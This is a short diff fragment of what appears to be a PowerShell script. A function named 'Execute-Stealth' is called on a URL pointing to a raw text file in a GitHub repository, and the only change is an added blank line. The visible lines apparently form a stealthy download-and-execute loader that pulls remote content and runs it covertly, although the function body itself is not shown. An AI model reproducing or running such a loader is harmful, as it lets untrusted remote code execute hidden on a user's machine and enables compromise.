@@ -102,3 +102,4 @@ function Execute-Stealth {
 $url = "https://raw.githubusercontent.com/thegoatofapi/mth/main/file.txt"
 
 Execute-Stealth -url $url
+
